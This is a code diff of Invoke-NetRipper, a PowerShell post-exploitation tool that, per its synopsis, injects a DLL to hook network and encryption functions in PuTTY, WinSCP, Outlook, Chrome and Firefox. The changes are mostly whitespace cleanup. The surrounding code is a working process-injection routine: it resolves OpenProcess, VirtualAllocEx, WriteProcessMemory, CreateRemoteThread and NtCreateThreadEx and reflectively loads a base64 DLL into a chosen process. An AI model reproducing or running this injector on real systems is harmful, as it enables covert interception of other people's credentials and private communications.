@@ -1,13 +1,13 @@
 function Invoke-NetRipper {
     <#
     .SYNOPSIS
-    NetRipper is a post exploitation tool targeting Windows systems which 
-    uses API hooking in order to intercept network traffic and encryption 
-    related functions from a low privileged user, being able to capture both 
+    NetRipper is a post exploitation tool targeting Windows systems which
+    uses API hooking in order to intercept network traffic and encryption
+    related functions from a low privileged user, being able to capture both
     plain-text traffic and encrypted traffic before encryption/after decryption.
-    Currently works on: Putty, WinSCP, SQL Server Management Studio, 
+    Currently works on: Putty, WinSCP, SQL Server Management Studio,
     Lync (Skype for Business), Microsoft Outlook, Google Chrome, Mozilla Firefox
-    
+
     NetRipper was written by Ionut Popescu (see links).
     PowerShell port by @harmj0y and based on PowerSploit code by @mattifestation
 
@@ -108,7 +108,7 @@ function Invoke-NetRipper {
         {
             throw("Could not find string $FindString !")
         }
-        Write-Verbose "[*] Pattern found at $index: $FindString"
+        Write-Verbose "[*] Pattern found at $index : $FindString"
         Write-Verbose "[*] Replacing with pattern: $ReplaceString"
 
         for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
@@ -124,11 +124,11 @@ function Invoke-NetRipper {
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -143,7 +143,7 @@ function Invoke-NetRipper {
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
     function Local:Get-ProcAddress
@@ -151,11 +151,11 @@ function Invoke-NetRipper {
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -172,7 +172,7 @@ function Invoke-NetRipper {
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
         # Return the address of the function
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
@@ -182,22 +182,22 @@ function Invoke-NetRipper {
         [Parameter(Position = 1, Mandatory = $true)]
         [IntPtr]
         $ProcessHandle,
-     
+
         [Parameter(Position = 2, Mandatory = $true)]
         [IntPtr]
         $StartAddress,
-     
+
         [Parameter(Position = 3, Mandatory = $false)]
         [IntPtr]
         $ArgumentPtr = [IntPtr]::Zero,
-     
+
         [Parameter(Position = 4, Mandatory = $true)]
         [System.Object]
         $Win32Functions
         )
-     
+
         [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
-     
+
         $OSVersion = [Environment]::OSVersion.Version
         #Vista and Win7
         if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
@@ -216,58 +216,58 @@ function Invoke-NetRipper {
             Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
             $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
         }
-     
+
         if ($RemoteThreadHandle -eq [IntPtr]::Zero)
         {
             Write-Verbose "Error creating remote thread, thread handle is null"
         }
-     
+
         return $RemoteThreadHandle
     }
     function Local:Get-Win32Functions
     {
         $Win32Functions = New-Object System.Object
-        
+
         $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
         $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
         $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name OpenProcess -Value $OpenProcess
-        
+
         $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
         $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
         $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
-        
+
         $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
-        
+
         $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
         $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
         $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
-        
+
         $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
         $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32])
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
-        
+
         $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
         $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
         $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name CloseHandle -Value $CloseHandle
-        
+
         $GetLastErrorAddr = Get-ProcAddress kernel32.dll GetLastError
         $GetLastErrorDelegate = Get-DelegateType @() ([Uint32])
         $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name GetLastError -Value $GetLastError
-        
+
         $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
         $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
         $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
         $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
-        
+
         # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
         $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
         if ($IsWow64ProcessAddr)
@@ -276,9 +276,9 @@ function Invoke-NetRipper {
             $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
             $Win32Functions |  Add-Member NoteProperty -Name IsWow64Process -Value $IsWow64Process
         }
-        
+
         return $Win32Functions
-        
+
     }
     function Local:Inject-NetRipper
     {
@@ -286,11 +286,11 @@ function Invoke-NetRipper {
             [Parameter(Position = 1, Mandatory = $true)]
             [Int]
             $ProcessID,
-         
+
             [Parameter(Position = 2, Mandatory = $true)]
             [String]
             $Base64DLL,
-         
+
             [Parameter(Position = 3, Mandatory = $true)]
             [Int]
             $ReflectiveOffset,
@@ -324,7 +324,7 @@ function Invoke-NetRipper {
         {
             # Determine is the process specified is 32 or 64 bit
             $null = $Win32Functions.IsWow64Process.Invoke($hProcess, [Ref] $IsWow64)
-            
+
             if ((!$IsWow64) -and $PowerShell32bit)
             {
                 Throw '64-bit processes not supported at this time.'
@@ -367,13 +367,13 @@ function Invoke-NetRipper {
         Write-Verbose ".DLL memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
         # Copy .DLL into the previously allocated memory
         $null = $Win32Functions.WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $RawBytes, $RawBytes.Length, [Ref] 0)
-        
+
         # Execute .dll as a remote thread, offset for the ReflectiveLoader function
         $RemoteMemAddrOffset = New-Object IntPtr ($RemoteMemAddr.ToInt64()+$ReflectiveOffset)
         Write-Verbose "RemoteMemAddr: $RemoteMemAddr"
         Write-Verbose "LoaderOffset: $ReflectiveOffset"
         Write-Verbose "LoaderMemAddr: $RemoteMemAddrOffset"
-        
+
         $ThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $hProcess -StartAddress $RemoteMemAddrOffset -Win32Functions $Win32Functions
 
         Write-Verbose "ThreadHandle: $ThreadHandle"
@@ -388,7 +388,7 @@ function Invoke-NetRipper {
         Start-Sleep -s 1
         Write-Verbose '.DLL injection complete!'
     }
-    
+
     $Win32Functions = Get-Win32Functions
 
     # the NetRipper dll
@@ -423,7 +423,7 @@ function Invoke-NetRipper {
         }
     }
     elseif ($ProcessID) {
-        "Injecting NetRipper into process with ID $ProcessID `n"    
+        "Injecting NetRipper into process with ID $ProcessID `n"
         Inject-NetRipper -ProcessID $ProcessID -Base64DLL $Base64DLL -ReflectiveOffset $ReflectiveOffset -XMLConfig $XMLConfig -Win32Functions $Win32Functions
     }
     else {
